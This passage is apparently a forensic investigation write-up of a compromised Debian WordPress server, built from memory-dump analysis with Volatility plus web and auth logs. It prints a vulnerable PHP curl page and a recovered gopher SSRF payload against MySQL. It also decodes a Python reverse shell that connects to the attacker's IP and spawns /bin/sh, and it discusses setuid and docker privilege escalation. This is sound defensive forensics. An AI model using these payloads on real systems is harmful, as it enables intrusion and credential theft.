+192.168.122.158 - - [27/Dec/2018:19:58:39 +0100] &quot;GET / HTTP/1.0&quot; 200 17847 &quot;-&quot; &quot;-&quot;
+--
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 927 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:20:52:48 +0100] &quot;GET /wp-admin/ HTTP/1.1&quot; 302 410 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] &quot;GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1 HTTP/1.1&quot; 200 3608 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] &quot;GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1&quot; 200 28983 &quot;http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+</code></pre>
+
+<p>Monique must found something on her last request because she decided to go on WordPress admin panel: <code>wp-admin</code>. She probably discovered something that allowed her to log on as <strong>eddiethehead</strong>.</p>
+
+<p>However, we need to stay focus on our task: finding the entry point. The attacker requested many time <code>test.php</code> web page before logging in. She must have exploit something at <code>19:58:58</code>.</p>
+
+<p>Here are <code>test.php</code> and <code>config_test.php</code> web pages:</p>
+
+<pre><code class="language-bash">webserver $ cat /var/www/html/test.php
+&lt;?php 
+include_once &quot;config_test.php&quot;;
+?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Super curling&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt;
+		URL Checker - Beta: 
+		&lt;input type=&quot;text&quot; name='url' /&gt;		
+	&lt;/form&gt;
+&lt;?php
+if (isset($_POST['url'])&amp;&amp;!empty($_POST['url']))
+{
+	$url = $_POST['url'];
+	$content_url = getUrlContent($url);
+}
+else
+{
+	$content_url = &quot;&quot;;
+}
+
+if(isset($_GET['debug']))
+{
+	show_source(__FILE__);
+}
+?&gt; 
+&lt;/body&gt;
+&lt;/html&gt;
+
+webserver $ cat /var/www/html/config_test.php
+&lt;?php
+function safe($url)
+{
+	$tmpurl = parse_url($url, PHP_URL_HOST);
+	if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)
+	{
+		var_dump($tmpurl);
+		die(&quot;&lt;h1&gt;Only access to localhost&lt;/h1&gt;&quot;);
+	}
+	return $url;
+}
+
+function getUrlContent($url){
+	$url = safe($url);
+	$url = escapeshellarg($url);
+	$pl = &quot;curl -v &quot;.$url;
+	echo $pl;
+	$content = shell_exec($pl);
+	echo $content;
+	return $content;
+}
+?&gt;
+</code></pre>
+
+<p>So this page makes a poor curl on a page located in the localhost (127.0.0.1). Odie told me it was for a course project or something, whatever. He probably got fucked because of this project</p>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/blue_5.gif" alt="" />
+</center></p>
+
+<p>We have found several interesting websites:</p>
+
+<blockquote>
+<p><a href="https://www.dailysecurity.fr/server-side-request-forgery/">https://www.dailysecurity.fr/server-side-request-forgery/</a></p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</a></p>
+</blockquote>
+
+<p>On Geluchat website, Odie sees things about <code>file://</code> and <code>gopher://</code> stuff. Odie is an ethical person and his school too. ENSIBS teach only cyberdefense stuff, not offensive security, it&rsquo;s not CDAISI. Nevertheless, he decided to search into the memory these artifacts. Sometimes we need some luck:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y &quot;file://&quot; &gt; yarascan_file
+$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y &quot;gopher://&quot; &gt; yarascan_gopher
+$ cat yarascan_file | wc -l               
+884
+$ cat yarascan_gopher| wc -l
+17
+</code></pre>
+
+<p>No more stupid than anyone else, I prefer to start with the smallest file:</p>
+
+<pre><code class="language-bash">$ cat yarascan_gopher       
+Task: apache2 pid 21463 rule r1 addr 0x7f072b473019
+0x7f072b473019  67 6f 70 68 65 72 3a 2f 2f 31 32 37 2e 30 2e 30   gopher://127.0.0
+0x7f072b473029  2e 31 3a 33 33 30 36 2f 5f 25 61 63 25 30 30 25   .1:3306/_%ac%00%
+0x7f072b473039  30 30 25 30 31 25 38 35 25 61 32 25 33 66 25 30   00%01%85%a2%3f%0
+0x7f072b473049  30 25 30 30 25 30 30 25 30 30 25 30 31 25 32 31   0%00%00%00%01%21
+0x7f072b473059  25 30 30 25 30 30 25 30 30 25 30 30 25 30 30 25   %00%00%00%00%00%
+0x7f072b473069  30 30 25 30 30 25 30 30 25 30 30 25 30 30 25 30   00%00%00%00%00%0
+0x7f072b473079  30 25 30 30 25 30 30 00 33 47 2b 07 7f 00 00 03   0%00%00.3G+.....
+0x7f072b473089  00 00 00 ff ff ff ff ff ff ff ff 05 00 00 00 09   ................
+0x7f072b473099  00 00 00 ff ff ff ff 01 00 00 00 ff ff ff ff 08   ................
+0x7f072b4730a9  00 00 00 04 00 00 00 06 00 00 00 ff ff ff ff ff   ................
+0x7f072b4730b9  ff ff ff 00 00 00 00 f8 90 52 2b 07 7f 00 00 11   .........R+.....
+0x7f072b4730c9  00 00 00 ff ff ff ff 6f f0 0a bf b7 d0 00 80 58   .......o.......X
+0x7f072b4730d9  46 fc 23 07 7f 00 00 18 91 52 2b 07 7f 00 00 11   F.#......R+.....
+0x7f072b4730e9  00 00 00 ff ff ff ff b8 c3 45 9c e2 8b ac be 58   .........E.....X
+0x7f072b4730f9  69 fd 23 07 7f 00 00 80 33 47 2b 07 7f 00 00 07   i.#.....3G+.....
+0x7f072b473109  00 00 00 0a 00 00 00 01 00 00 00 ff ff ff ff 0b   ................
+</code></pre>
+
+<p>And here is the magic trick:</p>
+
+<blockquote>
+<p>gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00</p>
+</blockquote>
+
+<p><center>
+<img src="https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif" alt="" />
+</center></p>
+
+<p>Decoding this data is not really useful&hellip; Some non-printable bytes. Let&rsquo;s extract the memory of the PID <code>21463</code> and fitler on <code>%[0-9]{2}</code>:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x00007f072b400000 -p 21463 -D .
+$ strings ./task.21463.0x7f072b400000.vma | grep -E &quot;%[0-9]{2}&quot;
+69%6f%6e%070
+%00%
+9%62
+70%61
+d%20%77%P
+'gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00
+%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01'
+%10gT+
+
+$ echo -n &quot;%69%6f%6e%07%62%70%61%20%77%%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01%10&quot; | tr -d &quot;%&quot; | xxd -r -p
+ionbpa w���?!b.wp_users
+</code></pre>
+
+<p>Odie finds the string <code>b.wp_users</code>. In WordPress world, <code>wp_users</code> is the MySQL table where user informations are stored. By user informations, I mean username, hashed password and so on.</p>
+
+<p>I think we found the entry point: Monique exploited an SSRF and get WordPress credentials stored in the MySQL database.</p>
+
+<h3 id="reverse-shell">Reverse shell</h3>
+
+<p>Knowing the entry point (<code>test.php</code>) makes easier to understand why Monique rushed to the WordPress administration page (<code>wp-admin</code>):</p>
+
+<pre><code class="language-bash">webserver $ cat access.log | grep 158 | grep -A 4 test.php | grep -v -E &quot;DirBuster|Nmap&quot;
+[...]
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;POST /test.php HTTP/1.1&quot; 200 927 &quot;http://192.168.122.216/test.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:19:58:58 +0100] &quot;GET /favicon.ico HTTP/1.1&quot; 404 506 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:20:52:48 +0100] &quot;GET /wp-admin/ HTTP/1.1&quot; 302 410 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] &quot;GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1 HTTP/1.1&quot; 200 3608 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+192.168.122.158 - - [27/Dec/2018:20:52:49 +0100] &quot;GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1&quot; 200 28983 &quot;http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+</code></pre>
+
+<p>Since there is only one user on the website (<strong>eddiethehead</strong>), it&rsquo;s not really hard to guess with which account Monique logged in. Going down a little bit in the log file, something caught my attention:</p>
+
+<pre><code class="language-bash">webserver $ cat access.log | less -N
+[...]
+   2778 192.168.122.158 - - [27/Dec/2018:20:53:18 +0100] &quot;POST /wp-admin/admin-ajax.php HTTP/1.1&quot; 200 431 &quot;http://192.168.122.216/wp-admin/theme-editor.php&quot; &quot;Mozilla/5.0 (X   2778 11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+   2779 ::1 - - [27/Dec/2018:20:53:24 +0100] &quot;OPTIONS * HTTP/1.0&quot; 200 126 &quot;-&quot; &quot;Apache/2.4.25 (Debian) (internal dummy connection)&quot;
+   2780 192.168.122.158 - - [27/Dec/2018:20:53:25 +0100] &quot;GET /wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&amp;theme=rock-band HTTP/1.1&quot; 200 11888 &quot;http://192.168.122.2   2780 16/wp-admin/theme-editor.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+[...]
+</code></pre>
+
+<p>The web page <code>theme-editor</code>, its name is explicit. With Odie we wonder why Monique edited the WordPress theme. She doesn&rsquo;t like Iron Maiden?</p>
+
+<p>Odie followed the URL found in the log:</p>
+
+<blockquote>
+<p><a href="http://192.168.122.216/wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&amp;theme=rock-band">http://192.168.122.216/wp-admin/theme-editor.php?file=inc%2Fcustomizer.php&amp;theme=rock-band</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/infosec_stuff/odie_gs/blue_4.png" alt="" />
+</center></p>
+
+<p>At the very first view, nothing really awful over there. But Monique edited a PHP web page: <code>customizer.php</code>. We can hypothesize that the evil hacker injects arbitrary PHP code in this page in order to get access on the Debian server.</p>
+
+<p>Unfortunately, Monique removed her arbitrary code before leaving, so no proof&hellip; Even in the memory dump, there doesn&rsquo;t seem to be much:</p>
+
+<pre><code class="language-bash">$ cat pfile_list| grep &quot;rock-band&quot;     
+----------------                0x0 /bin/bin/var/www/html/wp-content/languages/themes/rock-band-fr_FR.mo
+          532630 0xffff979692ed5948 /bin/bin/var/www/html/wp-content/themes/rock-band
+          532646 0xffff979692ef9a88 /bin/bin/var/www/html/wp-content/themes/rock-band/functions.php
+          532639 0xffff979692ef41a8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc
+----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/customizer.php~
+----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ensibssecretproject
+----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/ens
+          532643 0xffff979692ef5a48 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/override-parent.php
+          532640 0xffff979692ef45d8 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox
+          532641 0xffff979692ef4a08 /bin/bin/var/www/html/wp-content/themes/rock-band/inc/metabox/metabox.php
+          532631 0xffff979692ed50e8 /bin/bin/var/www/html/wp-content/themes/rock-band/languages
+----------------                0x0 /bin/bin/var/www/html/wp-content/themes/rock-band/languages/fr_FR.mo
+</code></pre>
+
+<p>I can still see this:</p>
+
+<ul>
+<li>customizer.php~</li>
+<li>ensibssecretproject</li>
+</ul>
+
+<p>The first file is follow by the <code>~</code> suffix, probably for temporary files. If we would manage to recover this file, we probably could get the arbitrary code.</p>
+
+<p>The second one, is an ENSIBS project of Odie, finding this file in this place is quite surprising.</p>
+
+<p>Let&rsquo;s look for <code>customizer.php</code> string in memory, with the yarascan plugin from Volatility and see where it appears:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y &quot;customizer.php&quot;
+[...]
+Task: apache2 pid 21733 rule r1 addr 0x7f0733fb39b7
+0x7f0733fb39b7  63 75 73 74 6f 6d 69 7a 65 72 2e 70 68 70 3f 78   customizer.php?x
+0x7f0733fb39c7  3d 70 79 74 68 6f 6e 25 32 30 2d 63 25 32 30 25   =python%20-c%20%
+0x7f0733fb39d7  32 37 69 6d 70 6f 72 74 25 32 30 73 6f 63 6b 65   27import%20socke
+0x7f0733fb39e7  74 2c 73 75 62 70 72 6f 63 65 73 73 2c 6f 73 3b   t,subprocess,os;
+0x7f0733fb39f7  73 3d 73 6f 63 6b 65 74 2e 73 6f 63 6b 65 74 28   s=socket.socket(
+0x7f0733fb3a07  73 6f 63 6b 65 74 2e 41 46 5f 49 4e 45 54 2c 73   socket.AF_INET,s
+0x7f0733fb3a17  6f 63 6b 65 74 2e 53 4f 43 4b 5f 53 54 52 45 41   ocket.SOCK_STREA
+0x7f0733fb3a27  4d 29 3b 73 2e 63 6f 6e 6e 65 63 74 28 28 25 32   M);s.connect((%2
+0x7f0733fb3a37  32 31 39 32 2e 31 36 38 2e 31 32 32 2e 31 35 38   2192.168.122.158
+0x7f0733fb3a47  25 32 32 2c 33 36 31 35 29 29 3b 6f 73 2e 64 75   %22,3615));os.du
+0x7f0733fb3a57  70 32 28 73 2e 66 69 6c 65 6e 6f 28 29 2c 30 29   p2(s.fileno(),0)
+0x7f0733fb3a67  3b 25 32 30 6f 73 2e 64 75 70 32 28 73 2e 66 69   ;%20os.dup2(s.fi
+0x7f0733fb3a77  6c 65 6e 6f 28 29 2c 31 29 3b 25 32 30 6f 73 2e   leno(),1);%20os.
+0x7f0733fb3a87  64 75 70 32 28 73 2e 66 69 6c 65 6e 6f 28 29 2c   dup2(s.fileno(),
+0x7f0733fb3a97  32 29 3b 70 3d 73 75 62 70 72 6f 63 65 73 73 2e   2);p=subprocess.
+0x7f0733fb3aa7  63 61 6c 6c 28 5b 25 32 32 2f 62 69 6e 2f 73 68   call([%22/bin/sh
+[...]
+</code></pre>
+
+<p>We can notice something really strange, it could be dangerous:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p 21733 &gt; papache_customizerphp
+$ cat papache_customizerphp| grep 7f0733fb        
+0xffff9796baa41000    21733 apache2              0x00007f0733fae000 0x00007f0733fb4000 rw-                   0x0      0      0          0 
+0xffff9796baa41000    21733 apache2              0x00007f0733fb4000 0x00007f0733fc4000 rwx                   0x0      0      0          0 
+$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x00007f0733fae000 -p 21733 -D .
+Volatility Foundation Volatility Framework 2.6.1
+Task       VM Start           VM End                         Length Path
+---------- ------------------ ------------------ ------------------ ----
+     21733 0x00007f0733fae000 0x00007f0733fb4000             0x6000 ./task.21733.0x7f0733fae000.vma
+$ strings ./task.21733.0x7f0733fae000.vma | grep customizer.php
+band/inc/customizer.php47
+51%\GET /wp-content/themes/rock-band/inc/customizer.php?x=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.122.158%22,3615));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
+192.168.122.158 - - [27/Dec/2018:21:08:21 +0100] &quot;GET /wp-content/themes/rock-band/inc/customizer.php?x=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.122.158%22,3615));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1&quot; 500 185 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;
+</code></pre>
+
+<p>After URL decoding the data (thanks CyberChef), beautify the python code, it looks to:</p>
+
+<pre><code class="language-python">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;192.168.122.158&quot;,3615))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+</code></pre>
+
+<p>The code is explicit, it gives an interactive <code>/bin/sh</code> to the suspicious IP address (IP owns by Monique) through a network socket on TCP port 3615. I think we found the arbitrary code injected: command execution in PHP.</p>
+
+<h3 id="privilege-escalation">Privilege escalation</h3>
+
+<p>We are starting to get a good look on actions made by Monique. However, there is something strange, what happened between the reverse shell and the backdoor?</p>
+
+<p>Monique got an access as <strong>www-data</strong>, not as <strong>root</strong>. She must be doing at least one privilege escalation.</p>
+
+<p>In fact, we could stop the investigation here. We know where the backdoor is, we know where is the entry point. In principle, if we correct these issues, Monique will no longer be able to get access to the Odie&rsquo;s VPS. But we&rsquo;re here to learn things and have fun! Then let&rsquo;s going further!</p>
+
+<h4 id="www-data-to-odie">www-data to odie</h4>
+
+<p>As we know, <strong>www-data</strong> got shell access the <code>27/12/2018 at 21:08:21</code>. In <code>auth.log</code> file, recovered from memory, we can see 10 minutes later an SSH connection using the Odie public key:</p>
+
+<pre><code class="language-bash">$ cat auth.log | grep -a '21:1' 
+[...]
+Dec 27 21:17:09 webserver sshd[21876]: Accepted publickey for odie from 192.168.122.158 port 36436 ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA
+[...]
+</code></pre>
+
+<p>I assume Odie&rsquo;s private key was stolen by Monique. She did at least two privilege escalation:</p>
+
+<blockquote>
+<p>www-data -&gt; odie ; odie -&gt; root</p>
+</blockquote>
+
+<p>The first privilege escalation will be hard to find because <strong>www-data</strong> doesn&rsquo;t have <code>.bash_history</code> files or other kinds of commands history. But, <strong>odie</strong> has his bash history, let&rsquo;s try to find out something useful:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_bash
+[...]
+     419 bash                 2018-12-27 18:31:58 UTC+0000   vim wrapper.c
+     419 bash                 2018-12-27 18:32:20 UTC+0000   gcc wrapper.c -o ensibssecretproject
+     419 bash                 2018-12-27 18:32:26 UTC+0000   chmod 6775 ensibssecretproject 
+     419 bash                 2018-12-27 18:32:29 UTC+0000   ./ensibssecretproject 
+[...]
+</code></pre>
+
+<p>Odie has put a sticky bit on a binary, it may be a good lead to start digging.</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y &quot;ensibssecretproject&quot; &gt; yarascan_ensibssecretproject
+$ strings ./task.419.0x1598000.vma | grep ensibs      
+chmod 6775 ensibssecretproject 
+mv ensibssecretproject /usr/local/bin/
+sudo mv ensibssecretproject /usr/local/bin/
+gcc wrapper.c -o ensibssecretproject
+./ensibssecretproject 
+ls -la /usr/local/bin/ensibssecretproject
+</code></pre>
+
+<p>Nothing unusual. Maybe a wrong lead?</p>
+
+<h4 id="odie-to-root">odie to root</h4>
+
+<p>The second privilege escalation will be easier to find! Let&rsquo;s take a look at running processes:</p>
+
+<pre><code class="language-bash">$ vol.py --plugins=../plug_vol/ --profile=LinuxOdie_profilex64 -f memory.dmp linux_psaux &gt; plinux_psaux
+$ cat plinux_psaux | grep &quot;0      0&quot; | grep -v '\['
+1      0      0      /sbin/init                                                      
+193    0      0      /lib/systemd/systemd-journald                                   
+216    0      0      /lib/systemd/systemd-udevd                                      
+324    0      0      /usr/sbin/rsyslogd -n                                           
+343    0      0      /usr/sbin/cron -f                                               
+344    0      0      /lib/systemd/systemd-logind                                     
+371    0      0      /sbin/agetty --noclear tty1 linux                               
+374    0      0      /usr/sbin/sshd -D                                               
+393    0      0      /sbin/dhclient -4 -v -pf /run/dhclient.enp1s0.pid -lf /var/lib/dhcp/dhclient.enp1s0.leases -I -df /var/lib/dhcp/dhclient6.enp1s0.leases enp1s0
+14659  0      0      /usr/lib/packagekit/packagekitd                                 
+14670  0      0      /usr/lib/policykit-1/polkitd --no-debug                         
+16169  0      0      /usr/bin/containerd                                             
+16290  0      0      /usr/bin/dockerd -H unix://                                     
+21462  0      0      /usr/sbin/apache2 -k start                                      
+22347  0      0      sudo su                                                         
+22348  0      0      su                                                              
+22349  0      0      bash                                                            
+22887  0      0      sudo insmod lime-4.9.0-8-amd64.ko path=/home/odie/memory.dmp format=lime timeout=0
+22888  0      0      insmod lime-4.9.0-8-amd64.ko path=/home/odie/memory.dmp format=lime timeout=0
+</code></pre>
+
+<p>The <strong>odie</strong> user is in the group of only two processes:</p>
+
+<pre><code class="language-bash">webserver $ id
+uid=1000(odie) gid=1000(odie) groupes=1000(odie),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
+</code></pre>
+
+<ul>
+<li>sudo</li>
+<li>docker</li>
+</ul>
+
+<p>Sudoers rights got default configuration, then you need the <strong>odie</strong> password to run commands as root. The attacker wouldn&rsquo;t managed to gain <strong>root</strong> access from <code>sudo</code>. It remains <code>docker</code>.</p>
+
+<p>The privilege escalation happened after <code>21:17:09</code>, it&rsquo;s the time of SSH key connection of Monique with the <strong>odie</strong> account:</p>
+
+<pre><code class="language-bash">$ cat auth.log | grep -a '21:1' 
+[...]
+Dec 27 21:17:09 webserver sshd[21876]: Accepted publickey for odie from 192.168.122.158 port 36436 ssh2: RSA SHA256:ewpGYcEucLCF/HglzVKufdAi1091iowCPAA95g2tDxA
+[...]
+$ cat daemon.log | grep -a &quot;21:&quot; | grep -E &quot;docker|container&quot;
+Dec 27 21:25:11 webserver dockerd[16290]: time=&quot;2018-12-27T21:25:11.184923869+01:00&quot; level=error msg=&quot;Download failed, retrying: unexpected EOF&quot;
+Dec 27 21:26:34 webserver dockerd[16290]: time=&quot;2018-12-27T21:26:34.788383276+01:00&quot; level=error msg=&quot;Not continuing with pull after error: context canceled&quot;
+Dec 27 21:35:33 webserver containerd[16169]: time=&quot;2018-12-27T21:35:33.625364744+01:00&quot; level=info msg=&quot;shim containerd-shim started&quot; address=&quot;/containerd-shim/moby/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/shim.sock&quot; debug=false pid=22019
+Dec 27 21:38:06 webserver containerd[16169]: time=&quot;2018-12-27T21:38:06.441456597+01:00&quot; level=info msg=&quot;shim reaped&quot; id=7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
+Dec 27 21:38:06 webserver dockerd[16290]: time=&quot;2018-12-27T21:38:06.452409767+01:00&quot; level=info msg=&quot;ignoring event&quot; module=libcontainerd namespace=moby topic=/tasks/delete type=&quot;*events.TaskDelete&quot;
+</code></pre>
+
+<p>A container has been created at <code>21:35:33</code> which is identified with:</p>
+
+<blockquote>
+<p>7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d</p>
+</blockquote>
+
+<p>It&rsquo;s possible to retrieve this docker&rsquo;s configuration:</p>
+
+<pre><code class="language-bash">$ cat pfile_list| grep &quot;7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d&quot;
+          541342 0xffff9796a94451a8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
+          541345 0xffff9796a94471e8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/parent
+          541344 0xffff9796a94455d8 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/init-id
+          541343 0xffff9796a9445a08 /bin/bin/var/lib/docker/image/overlay2/layerdb/mounts/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mount-id
+          541346 0xffff9796a9447a48 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
+          541348 0xffff9796439e5798 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/config.v2.json
+          541349 0xffff9796a9448a88 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostconfig.json
+          541358 0xffff979686544328 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-json.log
+          541356 0xffff9796a9456698 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts
+----------------                0x0 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/secrets
+          541357 0xffff9796a9456268 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/mounts/shm
+          541352 0xffff9796a9448658 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hostname
+          541355 0xffff9796a9448228 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf.hash
+          541353 0xffff979643985b48 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/resolv.conf
+          541351 0xffff9796a94c87d8 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/hosts
+          541347 0xffff9796a9447618 /bin/bin/var/lib/docker/containers/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d/checkpoints
+----------------                0x0 /bin/bin/var/lib/containerd/io.containerd.runtime.v1.linux/moby/7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d
+----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts.mount
+----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d.mount
+----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.d
+----------------                0x0 /bin/bin/usr/lib/systemd/user/var-lib-docker-containers-7a61f3cd00b111b4c47abf088a45bfd3a6ec7bf95ce7bddc8a8b1c732c5da68d-mounts-shm.mount.requires
